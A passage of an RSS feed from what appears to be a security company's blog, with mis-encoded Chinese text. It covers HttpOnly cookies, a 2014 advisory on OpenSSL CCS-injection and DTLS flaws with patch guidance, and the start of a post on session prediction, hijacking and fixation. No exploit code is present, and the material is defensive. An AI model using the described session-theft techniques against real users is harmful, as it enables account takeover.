&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;HttpOnly æ˜¯å­˜åœ¨å·²ä¹…çš„æŠ€è¡“ï¼Œä½†åœ¨æˆ‘å€‘&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;ç³»åˆ—æ–‡ç¬¬ä¸€ç¯‡&lt;/a&gt;çš„çµ±è¨ˆç•¶ä¸­ï¼Œæ¡ç”¨çš„æ¯”ä¾‹ä»ç„¶åä½ã€‚å¦‚åŒä¹‹å‰æˆ‘å€‘æåŠçš„ &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; å•é¡Œï¼Œå³ä½¿ä¸€é …è³‡å®‰æŠ€è¡“æˆ–è³‡å®‰è­°é¡Œå­˜åœ¨å¾ˆä¹…ï¼Œä¹Ÿéœ€è¦å¤§å®¶æŒçºŒé—œæ³¨ã€‚&lt;/p&gt;

&lt;p&gt;ä½†å³ä½¿æ¡ç”¨äº† HttpOnlyï¼Œä¹Ÿåƒ…èƒ½é˜²æ­¢æƒ¡æ„äººå£«ä¸æ­£ç•¶å­˜å– cookieï¼Œç„¡æ³•é˜²ç¦¦å…¶ä»–çš„ XSS æ”»æ“Šæ–¹å¼ï¼Œä¾‹å¦‚å°‡ä½¿ç”¨è€…å°å‘è‡³é‡£é­šç¶²ç«™é¨™å–å€‹è³‡ã€å°å‘è‡³æƒ¡æ„ç¶²ç«™æ¤å…¥å¾Œé–€ã€ç½®æ›ç¶²é å¤–è§€ç­‰ç­‰ã€‚åŒæ™‚æœªä¾†ä»æœ‰å¯èƒ½å‡ºç¾æ–°çš„ XSS æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤åƒè¬åˆ¥å› è¨­å®šäº† HttpOnly å°±æ‰ä»¥è¼•å¿ƒï¼Œèª¤ä»¥ç‚ºä¸æœƒå†è¢« XSS æ‰‹æ³•ä¾µå®³ä¼æ¥­åˆ©ç›Šæˆ–ç”¨æˆ¶è³‡æ–™ï¼Œä»ç„¶å¿…é ˆè¬¹æ…æª¢æŸ¥æ¯ä¸€å€‹ç³»çµ±è¼¸å‡ºè¼¸å…¥é»ï¼Œä»¥é¿å…æœªä¾†å› ä¸Šè¿°å½±éŸ¿å°è‡´ç”¨æˆ¶æˆ–ä¼æ¥­è’™å—æå¤±ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/</link>
                <guid>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</guid>
                <pubDate>Wed, 11 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL å†çˆ†åš´é‡æ¼æ´ï¼Œéƒ¨åˆ†é‡è¦ç¶²ç«™ä»åœ¨é¢¨éšªä¸­ï¼</title>
                <description>&lt;p&gt;(æœ¬ç¯‡æœ€å¾Œæ›´æ–°æ™‚é–“ï¼š2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL åœ˜éšŠæ–¼ 6/5 ä¿®è£œäº†&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;å…­é …å®‰å…¨æ¼æ´&lt;/a&gt;ï¼Œ&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; åœ¨&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;é€™ç¯‡æ–‡ç« &lt;/a&gt;ä¸­æ•´ç†äº†é€™å¹¾å€‹æ¼æ´çš„æ‘˜è¦ï¼Œé€™è£¡æˆªåœ–è¡¨æ ¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 å®‰å…¨æ›´æ–°æ¯”è¼ƒè¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ CVE-2014-0224ã€CVE-2014-0195 å…©é …è¢«åˆ—ç‚º Criticalï¼Œæˆ‘å€‘åˆ†åˆ¥ä¾†çœ‹çœ‹é€™å…©å€‹å¼±é»åˆ°åº•é€ æˆäº†ä»€éº¼å±å®³ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;èªªæ˜&quot;&gt;èªªæ˜&lt;/h4&gt;

&lt;p&gt;åŠ å¯†é€šè¨Šè¢«è¦–ç‚ºé é˜²&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;ä¸­é–“äººæ”»æ“Š&lt;/a&gt;çš„è§£æ³•ä¹‹ä¸€ï¼Œåˆ©ç”¨ SSL å”å®šé˜²æ­¢ç«Šè½ã€ç«„æ”¹å‚³è¼¸è³‡æ–™æ˜¯ä¸€ç¨®å¸¸è¦‹çš„æ–¹å¼ã€‚ç„¶è€Œ OpenSSL é€™æ¬¡å‡ºç¾åœ¨ ChangeCipherSpecï¼ˆæ›´æ”¹å¯†é‘°è¦æ ¼ï¼‰çš„è¨­è¨ˆç‘•ç–µï¼Œè®“æ”»æ“Šè€…æœ‰è¾¦æ³•è§£å¯†æ‰€æœ‰é€šè¨Šå…§å®¹ï¼Œè®“åŠ å¯†ä¿è­·å¾¹åº•å¤±æ•ˆã€‚&lt;/p&gt;

&lt;p&gt;è©²å¼±é»åŸç†æ˜¯ OpenSSL ä¼ºæœå™¨ç«¯åœ¨å¯¦ä½œ handshake æ™‚ä¸¦æœªæª¢æŸ¥è¨Šæ¯çš„é †åºï¼ˆåš´æ ¼ä¾†èªªæ˜¯ ChangeCipherSpec çš„é †åºï¼‰ï¼Œæ‰€ä»¥æ”»æ“Šè€…å¯ä»¥æå‰é€å‡º ChangeCipherSpec è¨Šæ¯ï¼Œä½¿ä¼ºæœå™¨åœ¨é‚„æœªåˆå§‹å®Œç•¢çš„ç‹€æ…‹å…ˆå»åš ChangeCipherSpec çš„å‹•ä½œï¼Œæœ€çµ‚é€ æˆåŠ è§£å¯†å¯è§£çš„ç‹€æ³ï¼Œæ˜¯ä»¥æ­¤å¼±é»ç¨±ä¹‹ç‚º CCS Injectionã€‚æ›´å¤šçš„ç´°ç¯€è«‹åƒè€ƒåŸé€šå ±è€… Masashi Kikuchi çš„&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;éƒ¨è½æ ¼&lt;/a&gt;ï¼Œä½ä»¥&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;é€™ç¯‡&lt;/a&gt;é™„ç¨‹å¼ç¢¼çš„è§£èªªï¼ŒOpenSSL github ä¸Šé—œæ–¼ CVE-2014-0224 çš„ &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; ä¹Ÿå¯ä»¥å¹«åŠ©äº†è§£ã€‚&lt;/p&gt;

&lt;h4 id=&quot;èª°æ‡‰è©²æ³¨æ„&quot;&gt;èª°æ‡‰è©²æ³¨æ„&lt;/h4&gt;

&lt;p&gt;æ‰€æœ‰é  OpenSSL ä¿è­·é€£ç·šçš„æ‡‰ç”¨æœå‹™éƒ½éœ€è¦æ³¨æ„ã€‚åˆå°¤å…¶æ˜¯éŠ€è¡Œã€é‡‘æµæœå‹™é€™äº›é€£ç·šä¸­å­˜åœ¨é‡‘èè³‡è¨Šçš„æœå‹™ï¼Œè‹¥ä¸æ³¨æ„æœƒé€ æˆä¿¡ç”¨å¡å¡è™Ÿæ´©æ¼ï¼Œç¶²è·¯éŠ€è¡Œè¢«ç›œç”¨ã€‚ç¶“éå¯¦éš›æª¢æ¸¬ï¼Œ&lt;strong&gt;ç›®å‰ä»æœ‰éŠ€è¡Œå–®ä½å’Œé‡‘æµå–®ä½ä½¿ç”¨æœ‰å•é¡Œçš„ OpenSSL ç‰ˆæœ¬&lt;/strong&gt;ã€‚æ¶ˆè²»è€…éœ€è¦ç‰¹åˆ¥æ³¨æ„ï¼Œåœ¨ä½¿ç”¨å‰ä¹Ÿå¯é€éä¸‹é¢å°å·¥å…·ä¾†è¼”åŠ©æª¢æŸ¥è‡ªå·±æ‰€ä½¿ç”¨çš„æœå‹™ä½¿å¦å­˜åœ¨é¢¨éšªï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire æä¾›çš„&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;å°ç¨‹å¼&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;æ¸¬è©¦ç¶²ç«™ &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ…¶å¹¸çš„æ˜¯ï¼Œæ­¤å¼±é»åªç™¼ç”Ÿåœ¨ç”¨æˆ¶ç«¯åŠä¼ºæœå™¨ç«¯çš†ä½¿ç”¨æœ‰å•é¡Œ OpenSSL ç‰ˆæœ¬çš„ç‹€æ³ä¸‹ã€‚ä¸€èˆ¬ä¾†èªªï¼Œæ¡Œé¢ç«¯çš„ç€è¦½å™¨éƒ½ä¸æ˜¯ä½¿ç”¨ OpenSSLï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨è€…å¯ä»¥ç¨å¾®å®‰å¿ƒã€‚å•é¡Œæ¯”è¼ƒå¤§çš„æ˜¯ android ä½¿ç”¨è€…ï¼Œandroid å…§å»º OpenSSLï¼Œè¨±å¤š app å‘¼å«å®ƒä¾†é€²è¡ŒåŠ å¯†å‚³è¼¸ï¼Œæ‰€ä»¥å»ºè­° android ç”¨æˆ¶åœ¨ google é‡‹å‡ºæ›´æ–°å‰ï¼Œä¸è¦ä½¿ç”¨æ‰‹æ©Ÿé€£ç·šåˆ°æœ‰å•é¡Œçš„æœå‹™ï¼Œæˆ–ä½¿ç”¨è‡ªå¸¶ SSL çš„ appï¼Œä¾‹å¦‚ï¼šfirefoxã€æœ€æ–°ç‰ˆ Chrome (35.0.1916.141)â€¦ã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼Œè‹¥ä½¿ç”¨è€…å¸¸ç”¨åˆ°ä¸€äº›åŠ å¯†é€£ç·šæœå‹™ï¼Œä¾‹å¦‚ VPNï¼Œè«‹è‡ªè¡Œæ³¨æ„æ‰€ä½¿ç”¨è»Ÿé«”æ˜¯å¦ä½¿ç”¨ OpenSSLï¼Œä»¥å…å—åˆ° CCS Injection çš„å½±éŸ¿ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œèªªå€‹é¡Œå¤–è©±ï¼ŒåŸä¾†ç¾åœ¨ç™¼è¡¨æ¼æ´é‚„è¦ç‚ºæ¼æ´å‡ºå¼µåœ–ï¼Œåœ¨ Hacker News åŸè¨è«–ä¸²çš„&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;é€™ç¯‡å›æ‡‰&lt;/a&gt;ï¼Œå°±æœ‰äººèªªï¼šã€é€™å€‹æ¼æ´æœ‰ logo å—ï¼Ÿå¦‚æœæ²’æœ‰æˆ‘å°±ä¸æ‰“ç®—èªçœŸçœ‹å¾…å®ƒï¼ã€XD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;èªªæ˜-1&quot;&gt;èªªæ˜&lt;/h4&gt;

&lt;p&gt;OpenSSL åœ¨è™•ç† &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; è¨Šæ¯ä¸Šï¼Œç‚ºäº†é¿å… IP fragmentationï¼Œæ‰€ä»¥åšäº†ä¸€äº›è™•ç†æ©Ÿåˆ¶ï¼Œé€™å€‹è™•ç†æ©Ÿåˆ¶ä¸¦æ²’æœ‰å¥½å¥½é©—è­‰ DLTS ClientHello ä¸­çš„ fragment é•·åº¦ï¼ˆåš´æ ¼ä¾†èªªæ˜¯åœ¨æ­£ç¢ºçš„ä½ç½®åšé©—è­‰ï¼‰ï¼Œè‹¥æ”»æ“Šè€…ç™¼é€ä¸€å€‹å¾ˆé•·çš„ fragmentï¼Œèƒ½é€ æˆç·©è¡å€æº¢ä½æ”»æ“Šã€‚æ›´å¤šçš„ç´°ç¯€è«‹åƒè€ƒ&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;é€™ç¯‡æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ¯”è¼ƒæœ‰è¶£çš„æ˜¯é‚£æ®µå‡ºå•é¡Œçš„ç¨‹å¼ç¢¼æ˜¯ä¸€ä½æœ‰åå¾·åœ‹å·¥ç¨‹å¸« Robin Seggelmann å¯«çš„ï¼Œæœ‰åçš„é»åœ¨æ–¼ä¸Šæ¬¡éå¸¸åš´é‡çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; äº‹ä»¶ä¹Ÿæ˜¯ä»–å¯«çš„ code XD&lt;/p&gt;

&lt;h4 id=&quot;èª°æ‡‰è©²æ³¨æ„-1&quot;&gt;èª°æ‡‰è©²æ³¨æ„&lt;/h4&gt;

&lt;p&gt;ä½¿ç”¨ OpenSSL ä¸”æœ‰ç”¨åˆ° DTLS çš„æœå‹™æä¾›è€…ï¼Œé€šå¸¸æ˜¯ VoIPã€WebRTCã€VPN é€™é¡æœå‹™ï¼Œé€™å€‹é¢¨éšªæœ‰å¯èƒ½æœƒé€ æˆä¼ºæœå™¨è¢«å…¥ä¾µã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¿®è£œ&quot;&gt;ä¿®è£œ&lt;/h3&gt;

&lt;p&gt;é™¤äº†ä¸Šé¢æ‰€æåŠå…©å€‹åš´é‡é¢¨éšªï¼Œé€™æ¬¡çš„æ›´æ–°ä¹ŸåŒæ™‚ä¿®å¾©äº†å¹¾å€‹ DOS çš„å¼±é»ï¼Œå¼·çƒˆå»ºè­°ä¼ºæœå™¨ç«¯æ›´æ–°ã€‚&lt;br /&gt;
è«‹ç¢ºèª OpenSSL å·²ç¶“æ›´æ–°åˆ°ä¸‹é¢ç‰ˆæœ¬ï¼Œä¸¦ä¸”æœ‰é‡æ–°å•Ÿå‹•è®“å…¶ç”Ÿæ•ˆã€‚&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OpenSSL 0.9.8za&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.0m&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.1h&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ›´æ–°è³‡è¨Šä¾æ“šæ‰€ç”¨çš„ç³»çµ±åˆ†åˆ¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡ OpenSSL åšäº†æ•¸å€‹å®‰å…¨æ€§çš„æ›´æ–°ï¼Œé›–ç„¶ä¸è‹¥&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;ä¹‹å‰ Heartbleed é‚£éº¼åš´é‡&lt;/a&gt;ï¼Œä½†å»ä¹Ÿè®“ä½¿ç”¨è€…æš´éœ²åœ¨é¢¨éšªä¸­ã€‚å»ºè­°æœ‰ä½¿ç”¨ OpenSSL éƒ½æ‡‰è©²æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå°¤å…¶æ˜¯ä¸€äº›å¤§å‹çš„éŠ€è¡ŒåŠé‡‘æµæœå‹™ï¼Œæ›´æ‡‰å„˜é€Ÿæ›´æ–°ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/</link>
                <guid>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</guid>
                <pubDate>Mon, 09 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Session æ”»æ“Šèˆ‡é˜²è­·</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;å¤§å®¶é‚„è¨˜å¾—å››æœˆä»½çš„ &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; äº‹ä»¶å—ï¼Ÿç•¶æ™‚é™¤äº†ç¶²ç«™æœ¬èº«ä»¥å¤–ï¼Œå—å®³æœ€åš´é‡çš„å°±å±¬ VPN Server äº†ã€‚åœ‹å…§å¤–ä¸å°‘é§­å®¢ä¸çœ ä¸ä¼‘åˆ©ç”¨ Heartbleed æ¼æ´ç«Šå– VPN Server çš„ç®¡ç†è€… Session Cookieï¼Œé‹æ°£å¥½çš„è©±å°±å¯ä»¥ç›´æ¥ç™»å…¥å¤§ä¼æ¥­çš„å…§ç¶²ã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯ï¼Œå…¶å¯¦é€™æ¨£çš„é¢¨éšªæ˜¯å¯ä»¥é¿å…çš„ï¼Œä»Šå¤©æˆ‘å€‘ä»¥é–‹ç™¼è€…çš„è§’åº¦ä¾†è«‡è«‡ Session çš„æ”»æ“Šèˆ‡é˜²è­·ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ä»€éº¼æ˜¯-sessionä»€éº¼æ˜¯-cookie&quot;&gt;ä»€éº¼æ˜¯ Sessionï¼Ÿä»€éº¼æ˜¯ Cookieï¼Ÿ&lt;/h3&gt;

&lt;p&gt;åœ¨è«‡ Session ä¹‹å‰ï¼Œæˆ‘å€‘è¦å…ˆç­è§£ Cookieã€‚ä½ çŸ¥é“ç¶²ç«™æ˜¯å¦‚ä½•è¾¨è­˜æˆ‘å€‘çš„èº«ä»½å—ï¼Ÿç‚ºä»€éº¼æˆ‘å€‘è¼¸å…¥å®Œå¸³è™Ÿå¯†ç¢¼ä¹‹å¾Œï¼Œç¶²ç«™å°±çŸ¥é“æˆ‘å€‘æ˜¯èª°å‘¢ï¼Ÿå°±æ˜¯åˆ©ç”¨ Cookieã€‚Cookie æ˜¯ç¶²ç«™åœ¨ç€è¦½å™¨ä¸­å­˜æ”¾çš„è³‡æ–™ï¼Œå…§å®¹åŒ…æ‹¬ä½¿ç”¨è€…åœ¨ç¶²ç«™ä¸Šçš„åå¥½è¨­å®šã€æˆ–è€…æ˜¯ç™»å…¥çš„ Session IDã€‚ç¶²ç«™åˆ©ç”¨ Session ID ä¾†è¾¨èªè¨ªå®¢çš„èº«ä»½ã€‚&lt;/p&gt;

&lt;p&gt;Cookie æ—¢ç„¶å­˜æ”¾åœ¨ Client ç«¯ï¼Œé‚£å°±æœ‰è¢«ç«Šå–çš„é¢¨éšªã€‚ä¾‹å¦‚é€é &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scriptingï¼ˆè·¨ç«™è…³æœ¬æ”»æ“Šï¼Œåˆç¨± XSSï¼‰&lt;/a&gt;ï¼Œæ”»æ“Šè€…å¯ä»¥è¼•æ˜“ç«Šå–å—å®³è€…çš„ Cookieã€‚å¦‚æœ Cookie è¢«å·èµ°äº†ï¼Œä½ çš„èº«ä»½å°±è¢«ç«Šå–äº†ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ç”¨ä¸€å€‹è­¬å–»ä¾†è¡¨ç¤ºï¼šä½ åŠ å…¥äº†ä¸€å€‹ç§˜å¯†ä¿±æ¨‚éƒ¨ï¼Œå¡«å¯«å®Œæœƒå“¡è³‡æ–™å¾Œï¼Œå¾—åˆ°äº†ä¸€å¼µæœƒå“¡å¡ã€‚ä¹‹å¾Œåªè¦æ†‘é€™å¼µæœƒå“¡å¡ï¼Œå°±å¯ä»¥é€²å…¥é€™å€‹ä¿±æ¨‚éƒ¨ã€‚ä½†æ˜¯éš”å¤©ï¼Œä½ çš„æœƒå“¡å¡æ‰äº†ã€‚æ’¿èµ°ä½ æœƒå“¡å¡çš„äººï¼Œå°±å¯ä»¥ç”¨ä½ çš„æœƒå“¡å¡é€²å…¥é€™å€‹ç§˜å¯†ä¿±æ¨‚éƒ¨ï¼Œå› ç‚ºæœƒå“¡å¡ä¸Šæ²’æœ‰ä½ çš„ç…§ç‰‡æˆ–æ˜¯å…¶ä»–è¶³ä»¥è¾¨è­˜èº«åˆ†çš„è³‡è¨Šã€‚é€™å°±åƒæ˜¯ä¸€å€‹æœƒå“¡ç¶²ç«™ï¼Œæˆ‘å€‘ç”³è«‹äº†ä¸€å€‹å¸³è™Ÿï¼ˆå¡«å¯«æœƒå“¡è³‡æ–™åŠ å…¥ä¿±æ¨‚éƒ¨ï¼‰ï¼Œè¼¸å…¥å¸³è™Ÿå¯†ç¢¼ç™»å…¥ä¹‹å¾Œï¼Œå¾—åˆ°ä¸€çµ„ Cookieï¼Œå…¶ä¸­æœ‰ Session ID ä¾†è¾¨è­˜ä½ çš„èº«åˆ†ï¼ˆé€éæœƒå“¡å¡ä¾†è¾¨è­˜èº«åˆ†ï¼‰ã€‚ä»Šå¤©å¦‚æœ Cookie è¢«å·èµ°äº†ï¼ˆæœƒå“¡å¡è¢«æ’¿èµ°äº†ï¼‰ï¼Œåˆ¥äººå°±å¯ä»¥ç”¨ä½ çš„å¸³è™Ÿä¾†ç™»å…¥ç¶²ç«™ï¼ˆåˆ¥äººç”¨ä½ çš„æœƒå“¡å¡é€²å…¥ä¿±æ¨‚éƒ¨ï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;Session æ”»æ“Šæ‰‹æ³•æœ‰ä¸‰ç¨®ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;çŒœæ¸¬ Session ID (Session Prediction)&lt;/li&gt;
  &lt;li&gt;ç«Šå– Session ID (Session Hijacking)&lt;/li&gt;
  &lt;li&gt;å›ºå®š Session ID (Session Fixation)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æˆ‘å€‘ä»¥ä¸‹ä¸€ä¸€ä»‹ç´¹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;session-prediction-çŒœæ¸¬-session-id&quot;&gt;Session Prediction (çŒœæ¸¬ Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID å¦‚åŒæˆ‘å€‘å‰é¢æ‰€èªªçš„ï¼Œå°±å¦‚åŒæ˜¯æœƒå“¡å¡çš„ç·¨è™Ÿã€‚åªè¦çŸ¥é“ Session IDï¼Œå°±å¯ä»¥æˆç‚ºé€™å€‹ä½¿ç”¨è€…ã€‚å¦‚æœ Session ID çš„é•·åº¦ã€è¤‡é›œåº¦ã€é›œäº‚åº¦ä¸å¤ ï¼Œå°±èƒ½å¤ è¢«æ”»æ“Šè€…çŒœæ¸¬ã€‚æ”»æ“Šè€…åªè¦å¯«ç¨‹å¼ä¸æ–·æš´åŠ›è¨ˆç®— Session IDï¼Œå°±æœ‰æ©Ÿæœƒå¾—åˆ°æœ‰æ•ˆçš„ Session ID è€Œç«Šå–ä½¿ç”¨è€…å¸³è™Ÿã€‚&lt;/p&gt;

&lt;p&gt;åˆ†æ Session ID çš„å·¥å…·å¯ä»¥ç”¨ä»¥ä¸‹å¹¾ç¨®&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è§€å¯Ÿ Session ID çš„äº‚æ•¸åˆ†å¸ƒï¼Œå¯ä»¥äº†è§£æ˜¯å¦èƒ½å¤ æ¨å‡ºè¦å¾‹ã€çŒœæ¸¬æœ‰æ•ˆçš„ Session IDã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;åˆ†æ Session ID&quot; title=&quot;åˆ†æ Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ Session ID åˆ†æç¨‹å¼é€²è¡Œåˆ†æï¼Œè©•ä¼°æ˜¯å¦ç„¡æ³•è¢«é æ¸¬ã€‚å¦‚æœæ²’æœ‰ 100% çš„æŠŠæ¡è‡ªå·±æ’°å¯«çš„ Session ID ç”¢ç”Ÿæ©Ÿåˆ¶æ˜¯å®‰å…¨çš„ï¼Œä¸å¦¨ä½¿ç”¨å…§å»ºçš„ Session ID ç”¢ç”Ÿ functionï¼Œé€šå¸¸éƒ½æœ‰ä¸€å®šç¨‹åº¦çš„å®‰å…¨ã€‚&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking-ç«Šå–-session-id&quot;&gt;Session Hijacking (ç«Šå– Session ID)&lt;/h4&gt;

&lt;p&gt;ç«Šå– Session ID æ˜¯æœ€å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•ã€‚æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨å¤šç¨®æ–¹å¼ç«Šå– Cookie ç²å– Session IDï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;è·¨ç«™è…³æœ¬æ”»æ“Š (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)ï¼šåˆ©ç”¨ XSS æ¼æ´ç«Šå–ä½¿ç”¨è€… Cookie&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯ç«Šè½ï¼šä½¿ç”¨ ARP Spoofing ç­‰æ‰‹æ³•ç«Šè½ç¶²è·¯å°åŒ…ç²å– Cookie&lt;/li&gt;
  &lt;li&gt;é€é Referer å–å¾—ï¼šè‹¥ç¶²ç«™å…è¨± Session ID ä½¿ç”¨ URL å‚³éï¼Œä¾¿å¯èƒ½å¾ Referer å–å¾— Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç«Šå–åˆ©ç”¨çš„æ–¹å¼å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;å—å®³è€…å·²ç¶“ç™»å…¥ç¶²ç«™ä¼ºæœå™¨ï¼Œä¸¦ä¸”å–å¾— Session IDï¼Œåœ¨é€£ç·šéç¨‹ä¸­æ”»æ“Šè€…ç”¨ç«Šè½çš„æ–¹å¼ç²å–å—å®³è€… Session IDã€‚&lt;/p&gt;

